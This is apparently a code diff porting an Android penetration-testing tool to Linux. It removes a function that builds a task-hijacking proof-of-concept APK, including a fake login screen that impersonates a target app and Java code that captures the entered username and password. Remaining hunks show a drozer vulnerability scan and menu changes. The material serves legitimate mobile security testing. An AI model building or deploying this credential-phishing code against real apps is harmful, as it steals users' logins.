-    print(f"- Package: {target_package}")
-    print(f"- Activity: {target_activity}")
-    print("-" * 40)
-    
-    # Helper function
-    def ensure_directory_exists(path):
-        """Create directory if it doesn't exist"""
-        if not os.path.exists(path):
-            os.makedirs(path)
-
-    # Setup paths
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    project_dir = os.path.join(base_dir, "Task-Hijacking-PoC")
-    
-    # Find Android SDK
-    sdk_path = os.path.join(os.environ['LOCALAPPDATA'], 'Android', 'Sdk')
-    if not os.path.exists(sdk_path):
-        print("Error: Android SDK not found.")
-        print("Please install Android Studio and the Android SDK.")
-        sys.exit(1)
-
-    # Find build tools
-    build_tools_path = os.path.join(sdk_path, 'build-tools')
-    if not os.path.exists(build_tools_path):
-        print("Error: Android build tools not found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    # Get latest build tools version
-    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
-    if not versions:
-        print("Error: No build tools versions found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    latest_version = sorted(versions)[-1]
-    tools_path = os.path.join(build_tools_path, latest_version)
-
-    # Setup project structure
-    print("Setting up project...")
-    if os.path.exists(project_dir):
-        shutil.rmtree(project_dir)
-    
-    # Create project directories
-    src_dir = os.path.join(project_dir, "src")
-    java_dir = os.path.join(src_dir, "com", "taskhijacking", "poc")
-    res_dir = os.path.join(project_dir, "res")
-    
-    ensure_directory_exists(java_dir)
-    ensure_directory_exists(os.path.join(res_dir, "layout"))
-    ensure_directory_exists(os.path.join(res_dir, "values"))
-    ensure_directory_exists(os.path.join(res_dir, "drawable"))
-    
-    # Write Android Manifest with taskAffinity targeting the victim app
-    # This is key for the task hijacking attack
-    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.taskhijacking.poc">
-    
-    <application
-        android:allowBackup="true"
-        android:label="Task Hijacking PoC"
-        android:theme="@android:style/Theme.Material.Light">
-        
-        <!-- Main entry point (launcher) -->
-        <activity android:name=".MainActivity"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-        
-        <!-- Hijacking Activity that targets the specified app -->
-        <activity android:name=".HijackingActivity"
-            android:exported="true"
-            android:taskAffinity="{target_package}"
-            android:launchMode="singleTask"
-            android:excludeFromRecents="true"
-            android:theme="@android:style/Theme.Material.Light.NoActionBar">
-            
-            <intent-filter>
-                <action android:name="android.intent.action.VIEW" />
-                <category android:name="android.intent.category.DEFAULT" />
-                <category android:name="android.intent.category.BROWSABLE" />
-                <data android:scheme="http" />
-                <data android:host="target-app" />
-            </intent-filter>
-            
-            <!-- Additional intent filter to match target app's activity -->
-            <intent-filter>
-                <action android:name="android.intent.action.VIEW" />
-                <category android:name="android.intent.category.DEFAULT" />
-                <data android:scheme="package" android:host="{target_package}" />
-            </intent-filter>
-        </activity>
-    </application>
-</manifest>'''
-
-    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
-        f.write(manifest)
-
-    # Write layout file for MainActivity
-    main_layout = '''<?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:padding="16dp">
-
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Task Hijacking PoC"
-        android:textSize="24sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="16dp" />
-
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="This app demonstrates task hijacking vulnerability. Click the button below to launch the attack."
-        android:textSize="16sp"
-        android:layout_marginBottom="24dp" />
-
-    <Button
-        android:id="@+id/btnLaunchAttack"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Launch Attack"
-        android:layout_gravity="center" />
-
-</LinearLayout>'''
-
-    with open(os.path.join(res_dir, "layout", "activity_main.xml"), 'w') as f:
-        f.write(main_layout)
-
-    # Write layout file for Hijacking activity (fake login screen)
-    hijack_layout = f'''<?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:padding="16dp"
-    android:gravity="center">
-
-    <TextView
-        android:id="@+id/tvTitle"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="{target_package}"
-        android:textSize="24sp"
-        android:textStyle="bold"
-        android:gravity="center"
-        android:layout_marginBottom="32dp" />
-
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Please login to continue"
-        android:textSize="18sp"
-        android:gravity="center"
-        android:layout_marginBottom="24dp" />
-
-    <EditText
-        android:id="@+id/etUsername"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:hint="Username"
-        android:layout_marginBottom="8dp"
-        android:inputType="text" />
-
-    <EditText
-        android:id="@+id/etPassword"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:hint="Password"
-        android:layout_marginBottom="16dp"
-        android:inputType="textPassword" />
-
-    <Button
-        android:id="@+id/btnLogin"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Login" />
-
-    <TextView
-        android:id="@+id/tvStatus"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="TASK HIJACKING POC - CREDENTIALS WILL BE CAPTURED"
-        android:textColor="#FF0000"
-        android:gravity="center"
-        android:layout_marginTop="32dp"
-        android:textStyle="bold"/>
-
-</LinearLayout>'''
-
-    with open(os.path.join(res_dir, "layout", "activity_hijacking.xml"), 'w') as f:
-        f.write(hijack_layout)
-
-    # Write strings.xml
-    strings = '''<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name">Task Hijacking PoC</string>
-</resources>'''
-
-    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
-        f.write(strings)
-
-    # Write MainActivity.java
-    main_activity = f'''
-package com.taskhijacking.poc;
-
-import android.app.Activity;
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Bundle;
-import android.view.View;
-import android.widget.Button;
-import android.widget.Toast;
-
-public class MainActivity extends Activity {{
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {{
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        
-        Button btnLaunchAttack = findViewById(R.id.btnLaunchAttack);
-        btnLaunchAttack.setOnClickListener(new View.OnClickListener() {{
-            @Override
-            public void onClick(View v) {{
-                launchAttack();
-            }}
-        }});
-    }}
-    
-    private void launchAttack() {{
-        try {{
-            // Start our hijacking activity
-            Intent intent = new Intent(this, HijackingActivity.class);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            
-            // Show instruction to user
-            Toast.makeText(this, "Attack launched! Return to recent apps and you'll see the malicious activity", 
-                           Toast.LENGTH_LONG).show();
-            
-            // Try to launch the target app to see the attack in action
-            Intent launchTarget = getPackageManager().getLaunchIntentForPackage("{target_package}");
-            if (launchTarget != null) {{
-                startActivity(launchTarget);
-            }}
-        }} catch (Exception e) {{
-            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
-        }}
-    }}
-}}'''
-
-    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
-        f.write(main_activity)
-
-    # Write HijackingActivity.java
-    hijacking_activity = f'''
-package com.taskhijacking.poc;
-
-import android.app.Activity;
-import android.content.Intent;
-import android.os.Bundle;
-import android.util.Log;
-import android.view.View;
-import android.widget.Button;
-import android.widget.EditText;
-import android.widget.TextView;
-import android.widget.Toast;
-
-public class HijackingActivity extends Activity {{
-    private static final String TAG = "TaskHijacking";
-    private EditText etUsername;
-    private EditText etPassword;
-    private TextView tvStatus;
-    
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {{
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_hijacking);
-        
-        etUsername = findViewById(R.id.etUsername);
-        etPassword = findViewById(R.id.etPassword);
-        tvStatus = findViewById(R.id.tvStatus);
-        
-        Button btnLogin = findViewById(R.id.btnLogin);
-        btnLogin.setOnClickListener(new View.OnClickListener() {{
-            @Override
-            public void onClick(View v) {{
-                captureCredentials();
-            }}
-        }});
-        
-        // Set the target package name as the title
-        TextView tvTitle = findViewById(R.id.tvTitle);
-        tvTitle.setText("{target_package}");
-        
-        // Log the task hijacking attempt
-        Log.i(TAG, "Task hijacking attempt against package: {target_package}");
-        Log.i(TAG, "Target activity: {target_activity}");
-    }}
-    
-    private void captureCredentials() {{
-        String username = etUsername.getText().toString();
-        String password = etPassword.getText().toString();
-        
-        if (username.isEmpty() || password.isEmpty()) {{
-            Toast.makeText(this, "Please enter both username and password", Toast.LENGTH_SHORT).show();
-            return;
-        }}
-        
-        // In a real attack, credentials would be sent to an attacker's server
-        // For this PoC, we just log them locally
-        Log.i(TAG, "Captured credentials - Username: " + username);
-        Log.i(TAG, "Captured credentials - Password: " + password);
-        
-        tvStatus.setText("Credentials captured! Username: " + username);
-        
-        // Notify user this is a PoC
-        Toast.makeText(this, "Task hijacking successful! Credentials captured.", Toast.LENGTH_LONG).show();
-        
-        // In a real attack, the malicious app might now redirect to the legitimate app
-        // to avoid suspicion
-    }}
-    
-    @Override
-    protected void onNewIntent(Intent intent) {{
-        super.onNewIntent(intent);
-        Log.i(TAG, "onNewIntent: " + intent.toString());
-        // Received a new intent, which could be from returning to this task
-    }}
-}}'''
-
-    with open(os.path.join(java_dir, "HijackingActivity.java"), 'w') as f:
-        f.write(hijacking_activity)
-
-    # Find Android Studio's JDK
-    android_studio_path = os.path.join(os.environ['PROGRAMFILES'], 'Android', 'Android Studio')
-    if not os.path.exists(android_studio_path):
-        print("Error: Android Studio not found.")
-        print("Please install Android Studio in the default location.")
-        sys.exit(1)
-
-    jbr_path = os.path.join(android_studio_path, "jbr")
-    if not os.path.exists(jbr_path):
-        print("Error: Android Studio JDK not found.")
-        print("Please ensure Android Studio is properly installed.")
-        sys.exit(1)
-
-    os.environ['JAVA_HOME'] = jbr_path
-
-    # Build APK using Android build tools
-    print("Building APK...")
-    
-    # 1. Compile resources
-    print("Compiling resources...")
-    aapt = os.path.join(tools_path, "aapt.exe")
-    if not os.path.exists(aapt):
-        print("Error: aapt not found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    subprocess.run([aapt, "package", "-f", "-m",
-                   "-J", src_dir,
-                   "-M", os.path.join(project_dir, "AndroidManifest.xml"),
-                   "-S", res_dir,
-                   "-I", os.path.join(sdk_path, "platforms", "android-33", "android.jar")],
-                  check=True)
-
-    # 2. Compile Java files
-    print("Compiling Java files...")
-    javac = os.path.join(jbr_path, "bin", "javac.exe")
-    android_jar = os.path.join(sdk_path, "platforms", "android-33", "android.jar")
-    
-    # Create classes directory
-    classes_dir = os.path.join(project_dir, "classes")
-    ensure_directory_exists(classes_dir)
-
-    subprocess.run([javac,
-                   "-source", "1.8",
-                   "-target", "1.8",
-                   "-bootclasspath", android_jar,
-                   "-d", classes_dir,
-                   os.path.join(java_dir, "MainActivity.java"),
-                   os.path.join(java_dir, "HijackingActivity.java"),
-                   os.path.join(src_dir, "com", "taskhijacking", "poc", "R.java")],
-                  check=True)
-
-    # 3. Create JAR file
-    print("Creating JAR file...")
-    jar = os.path.join(jbr_path, "bin", "jar.exe")
-    classes_jar = os.path.join(project_dir, "classes.jar")
-    
-    # Change to classes directory to create jar with correct structure
-    current_dir = os.getcwd()
-    os.chdir(classes_dir)
-    subprocess.run([jar, "cf", classes_jar, "com"],
-                  check=True)
-    os.chdir(current_dir)
-
-    # 4. Convert JAR to DEX
-    print("Converting to DEX format...")
-    d8 = os.path.join(tools_path, "d8.bat")
-    if not os.path.exists(d8):
-        print("Error: d8 not found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    # Create output directory
-    dex_output_dir = os.path.join(project_dir, "dex-output")
-    ensure_directory_exists(dex_output_dir)
-    
-    subprocess.run([d8,
-                   "--lib", android_jar,
-                   "--output", dex_output_dir,
-                   classes_jar],
-                  check=True)
-
-    # 5. Build APK using Android Build Tools
-    print("Building APK...")
-    output_apk = os.path.join(base_dir, "task_hijacking.apk")
-    
-    # Create a minimal APK with just the necessary components
-    subprocess.run([aapt, "package", "-f", "-M", 
-                   os.path.join(project_dir, "AndroidManifest.xml"),
-                   "-S", res_dir,
-                   "-I", android_jar,
-                   "--min-sdk-version", "24",
-                   "--target-sdk-version", "28",
-                   "-F", output_apk],
-                  check=True)
-    
-    # Copy DEX file to current directory for easier adding
-    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), "classes.dex")
-    
-    # Add the DEX file to APK
-    subprocess.run([aapt, "add", output_apk, "classes.dex"],
-                  check=True)
-    
-    # Clean up
-    if os.path.exists("classes.dex"):
-        os.remove("classes.dex")
-
-    # APK is unsigned at this point
-    print("APK generation complete (unsigned).")
-    print(f"\nBuild successful! APK generated at: {output_apk}")
-    
-    # Ask user if they want to sign the APK
-    signed_apk = sign_apk(output_apk)
-    if signed_apk and signed_apk != output_apk:
-        print(f"\n{Fore.GREEN}✅ Final signed APK: {signed_apk}{Style.RESET_ALL}")
-        return signed_apk
-    else:
-        return output_apk
+    print(Fore.RED + "❌ APK building is not supported in this Linux-compatible version." + Style.RESET_ALL)
+    print(Fore.YELLOW + "⚠️ Please use Android Studio or command-line build tools directly." + Style.RESET_ALL)
 
 def drozer_vulnscan():
     global target_app
-    # Inizializzazione variabili per report HTML e separatore
     html_begin = "<html><head><title>APP Analysis Report</title></head><body><h1 style=\"text-align: center;\"><strong>Drozer Analysis Report</strong></h1>"
     separator = "_" * 100 + "\n"
     
-    # Check if target app is set, if not prompt to set it
     if not target_app:
         print(Fore.YELLOW + "⚠️ No target app set. Please select a target app first." + Style.RESET_ALL)
         set_target_app()
@@ -2969,12 +2024,10 @@ def drozer_vulnscan():
     p_name = target_app
     print(Fore.GREEN + f"Using target app: {p_name}" + Style.RESET_ALL)
     
-    # Richiesta di input all'utente per il nome del file
     file_name = input("Enter the file name to store the results: ")
     f_json = file_name + ".json"
     f_html = file_name + ".html"
     
-    # Funzione per eseguire il comando drozer e restituire l'output
     def perform_scan(query_type, p_name, a=0):
         drozer_command = 'drozer console connect -c "run ' + str(query_type) + ' ' + str(p_name) + '"'
         if a == 1:
@@ -2990,7 +2043,6 @@ def drozer_vulnscan():
             process_data = 'Invalid Package'
         return process_data
 
-    # Funzione per formattare i dati e salvare i risultati in file JSON e HTML
     def format_data(task, result, file_name):
         nonlocal html_begin
         html_out = 1
@@ -3012,7 +2064,6 @@ def drozer_vulnscan():
     
     print(Fore.BLUE + separator)
     
-    # Esecuzione delle scansioni con drozer e formattazione dei risultati
     package_info = perform_scan('app.package.info -a', p_name)
     format_data("Package Information", package_info, f_json)
     print(separator)
@@ -3081,7 +2132,6 @@ def drozer_vulnscan():
     format_data("Directory Traversal using Content Provider", dirtraversal_info, f_json)
     print(separator)
     
-    # Completa il report HTML e lo salva su file
     html_begin += "</body></html>"
     with open(f_html, "wb") as f:
         f.write(html_begin.encode("utf-8"))
@@ -3093,8 +2143,8 @@ def show_exploits_menu():
     print("\n" + "=" * 50)
     print(f"{'Exploits':^50}")
     print("=" * 50)
-    print("1. 🔍  Tapjacking")
-    print("2. 🔒  Task Hijacking")
+    print("1. 🔍  Tapjacking (Not available on Linux)")
+    print("2. 🔒  Task Hijacking (Not available on Linux)")
     print("3. ↩️  Back")
 
 def exploits_menu_loop():
@@ -3138,7 +2188,7 @@ def show_drozer_menu():
     print("=" * 50)
     print("1. 🏹  Install Drozer Agent")
     print("2. 🚀  Forward Port Locally (31415)")
-    print("3. 🐞  Perform Vulnearbility Scan")
+    print("3. 🐞  Perform Vulnerability Scan")
     print("4. ↩️  Back")
 
 def drozer_menu_loop():
@@ -3171,7 +2221,7 @@ def show_emulator_options_menu():
     print("\n" + "=" * 50)
     print(f"{'Emulator Options':^50}")
     print("=" * 50)
-    print("1. 🧹  Remove Ads and Bloatware from Nox Emulator")
+    print("1. 🧹  Remove Ads and Bloatware (Not implemented)")
     print("2. 🛡️  Install Burp Certificate")
     print("3. 💻  Open ADB shell")
     print("4. 📱  Start Smart ADB Logcat")
@@ -3196,7 +2246,7 @@ def show_frida_menu():
     print("9. ↩️  Back")
 
 # Metadata
-VERSION  = "1.0.0"
+VERSION  = "1.0.0-linux"
 
 def show_main_menu():
     logo = r"""
@@ -3211,6 +2261,7 @@ def show_main_menu():
     print(Fore.CYAN + logo + Style.RESET_ALL)
 
     print(Fore.RED + " Version  : " + Fore.YELLOW + VERSION)
+    print(Fore.YELLOW + " Platform : Linux Compatible")
     print()
 
     print("=" * 50)
@@ -3227,9 +2278,8 @@ def show_main_menu():
 def main():
     global emulator_type, emulator_installation_path, adb_command, device_serial, target_app
     
-    # Check if running in logcat mode (called from separate terminal)
+    # Check if running in logcat mode
     if len(sys.argv) > 1 and "--logcat-mode" in sys.argv:
-        # Parse command line arguments for logcat mode
         import argparse
         parser = argparse.ArgumentParser(description='Redroid Smart Logcat')
         parser.add_argument('--logcat-mode', action='store_true', help='Run in logcat mode')
@@ -3240,11 +2290,9 @@ def main():
         
         args = parser.parse_args()
         
-        # Set global variables from arguments
         device_serial = args.device
         adb_command = args.adb_command
         
-        # Run logcat directly
         run_inline_logcat(args.highlight, args.process_filter)
         return
 
